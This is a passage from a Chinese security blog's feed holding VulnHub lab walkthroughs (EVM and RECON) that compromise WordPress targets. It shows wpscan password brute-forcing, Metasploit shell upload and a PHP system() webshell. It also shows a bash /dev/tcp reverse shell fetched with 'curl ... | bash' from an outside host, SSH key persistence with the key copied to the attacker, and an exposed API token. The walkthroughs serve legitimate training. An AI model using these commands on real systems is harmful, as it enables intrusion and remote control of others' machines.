class=&#34;line&#34;&gt;eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-005.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过以下命令爆破wordpress用户名c0rrupt3d_brain的密码：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wpscan --url [http://192.168.](http://192.168.) 31 .1 55 /wordpress/ - U c0rrupt3d_brain -P&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/usr/share/wordlists/rockyou.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-006.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功得到 wordpress 网站的用户名：c0rrupt3d_brain ，密码： 24992499&lt;/p&gt;
&lt;h3 id=&#34;msf攻击wordpress&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf攻击wordpress&#34;&gt;#&lt;/a&gt; msf 攻击 wordpress&lt;/h3&gt;
&lt;p&gt;1) 得到账号密码，可以登入后台写入反弹 shell 到任意模板 getshell，&lt;br&gt;
也可以使用 msf 自带 exploit/unix/webapp/ 下的模块进行利用，因为 msf 方便，这里我选择后者&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用msf自带exploit/unix/webapp/下的模块进行利用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfconsole&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/unix/webapp/wp_admin_shell_upload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set password 24992499&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhosts 192.168.31.155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set username c0rrupt3d_brain&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set targeturi /wordpress&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-007.png&#34; alt&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;获取到标准的 shell&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;#x27;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-008.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;可以通过 nc 监听，将 shell 从 msf 反弹至一个普通的 terminal&lt;br&gt;
-&amp;gt; 成功得到一个 www-data 网站用户的 shell&lt;/p&gt;
&lt;h3 id=&#34;历史遗留文件提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#历史遗留文件提权&#34;&gt;#&lt;/a&gt; 历史遗留文件提权&lt;/h3&gt;
&lt;p&gt;查看是否有隐藏文件，判断出哪个文件可能是遗留密码&lt;br&gt;
这里很明显.root_password_ssh.txt 是 root 密码&lt;br&gt;
通过 su root 登陆到了 root 账户&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-009.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 成功得到 root 管理员的 shell&lt;/p&gt;
&lt;h3 id=&#34;密钥对权限维持&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#密钥对权限维持&#34;&gt;#&lt;/a&gt; 密钥对权限维持&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;服务端写 ssh 公钥，并将私钥文件发送至攻击机&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ssh-keygen -t rsa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat ~/.ssh/id_rsa.pub &amp;gt;&amp;gt; ~/.ssh/authorized_keys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;scp ~/.ssh/id_rsa parallels@192.168.31.135:~/.ssh/vulnhub_evm&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rm -f ~/.ssh/id_rsa*&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-010.png&#34; alt&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;攻击机保存私钥修改权限，并尝试连接靶机&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;chmod 700 vulnhub_evm&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh root@192.168.31.155 -i ~/.ssh/vulnhub_evm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-011.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
-&gt; 渗透结束
</content>
        <category term="VULNHUB 1-10" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/107%20RECON/</id>
        <title>VULNHUB 7 RECON</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/107%20RECON/"/>
        <content type="html">&lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcmVjb24tMSw0Mzgv&#34;&gt;https://www.vulnhub.com/entry/recon-1,438/&lt;/span&gt;&lt;br&gt;
 教程链接地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yZWFkeXNldGV4cGxvaXQud29yZHByZXNzLmNvbS8yMDIyLzAzLzA2L3Z1bG5odWItcmVjb24tMS8=&#34;&gt;https://readysetexploit.wordpress.com/2022/03/06/vulnhub-recon-1/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 RECON：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;通过 netdiscover 扫描当前网卡里边有哪些机器&lt;br&gt;
 &lt;code&gt;sudo netdiscover -i eth0 -r 192.168.31.0/24&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; myip.txt &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP&lt;br&gt;
 &lt;code&gt;sudo nmap -PA 192.168.31.0/24 --excludefile myip.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-103.png&#34; width=&#34;600&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.230&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;确认靶机 ip 开放的端口信息&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;sudo nmap -A -p 1-1024 192.168.31.230 -oN /tmp/recon.txt&lt;/code&gt; &lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-104.png&#34; width=&#34;540&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22,80&lt;/p&gt;
&lt;h3 id=&#34;wpscan-扫描-wordpress&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wpscan-扫描-wordpress&#34;&gt;#&lt;/a&gt; wpscan 扫描 wordpress&lt;/h3&gt;
&lt;p&gt;1）目录扫描&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.230/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-105.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 敏感网址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjMwL3dwLWxvZ2luLnBocD9yZWRpcmVjdF90bz1odHRwJTNBJTJGJTJGMTkyLjE2OC4zMS4yMzAlMkZ3cC1hZG1pbiUyRiZhbXA7cmVhdXRoPTE=&#34;&gt;http://192.168.31.230/wp-login.php?redirect_to=http%3A%2F%2F192.168.31.230%2Fwp-admin%2F&amp;amp;reauth=1&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjMwL3dwLWxvZ2luLnBocA==&#34;&gt;http://192.168.31.230/wp-login.php&lt;/span&gt;&lt;br&gt;
 对此网址进行弱口令爆破，sql 注入均无效果&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-106.png&#34; alt&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;wordpress 进行扫描用户&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;获取到wpscan的api token：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://wpscan.com/profile?pricingList=1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过以下命令枚举wordpress的用户名：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wpscan --url http://192.168.31.230 --enumerate u --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-107.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 用户 1:recon  用户 2:reconauthor&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;wordpress 针对已知用户扫描密码&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过以下命令爆破wordpress用户名recon reconauthor的密码：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wpscan --url http://192.168.31.230/ - U &amp;#x27;recon reconauthor&amp;#x27; -P /usr/share/wordlists/rockyou.txt --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-108.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 用户：reconauthor 密码：football7&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;登陆 wordpress 后台&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjMwL3dwLWxvZ2luLnBocA==&#34;&gt; http://192.168.31.230/wp-login.php&lt;/span&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-109.png&#34; alt&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-110.png&#34; alt&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;msf-测试-wordpress&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf-测试-wordpress&#34;&gt;#&lt;/a&gt; msf 测试 wordpress&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;msf 自带 exploit/unix/webapp/ 下的模块进行利用&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-111.png&#34; alt&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;msfconsole&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/unix/webapp/wp_admin_shell_upload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set password **football7**&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhosts 192.168.31. 230&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set username **reconauthor**&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set targeturi /&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;-&amp;gt; 认证成功，但上传失败&lt;/p&gt;
&lt;h3 id=&#34;后台上传-poc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#后台上传-poc&#34;&gt;#&lt;/a&gt; 后台上传 poc&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;从网站后台寻找突破&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;wordpress 后台上传文件 poc：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDY5ODE=&#34;&gt;https://www.exploit-db.com/exploits/46981&lt;/span&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-112.png&#34; alt&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;&amp;lt;html&amp;gt;I’m X_T, do you know me ?&amp;lt;/html&amp;gt;&amp;quot; &amp;gt; index.html&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;&amp;lt;?php echo system($_GET[&amp;#x27;X_T&amp;#x27;]); ?&amp;gt;&amp;quot; &amp;gt; index.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;zip poc.zip index.html index.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-113.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;依次按下列按钮点击&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Create a new Post -&amp;gt; Select `Add block` -&amp;gt; E-Learning -&amp;gt; Upload the poc.zip -&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Insert as: Iframe -&amp;gt; Insert&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-114.png&#34; alt&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-115.png&#34; alt&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-116.png&#34; alt&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-117.png&#34; alt&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-118.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjMwL3dwLWNvbnRlbnQvdXBsb2Fkcy9hcnRpY3VsYXRlX3VwbG9hZHMvcG9jOS9pbmRleC5odG1s&#34;&gt;http://192.168.31.230/wp-content/uploads/articulate_uploads/poc9/index.html&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-119.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; RCE 地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjMwL3dwLWNvbnRlbnQvdXBsb2Fkcy9hcnRpY3VsYXRlX3VwbG9hZHMvcG9jOS9pbmRleC5waHA/WF9UPWxz&#34;&gt;http://192.168.31.230/wp-content/uploads/articulate_uploads/poc9/index.php?X_T=ls&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-120.png&#34; alt&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;通过 RCE 漏洞反弹 shell&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;构造反弹shell地代码并开启http服务&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; shell.sh &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;! /bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -c &amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在靶机上执行：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl http://www.chentuo.asia/shell.sh | bash&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;-&amp;gt; 即在 url 地址上构造：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjMwL3dwLWNvbnRlbnQvdXBsb2Fkcy9hcnRpY3VsYXRlX3VwbG9hZHMvcG9jOS9pbmRleC5waHA/WF9UPWN1cmwlMjBodHRwOi8vd3d3LmNoZW50dW8uYXNpYS9zaGVsbC5zaCUyMCU3QyUyMGJhc2g=&#34;&gt;http://192.168.31.230/wp-content/uploads/articulate_uploads/poc9/index.php?X_T=curl http://www.chentuo.asia/shell.sh | bash&lt;/span&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-121.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-122.png&#34; alt&gt;&lt;/p&gt;
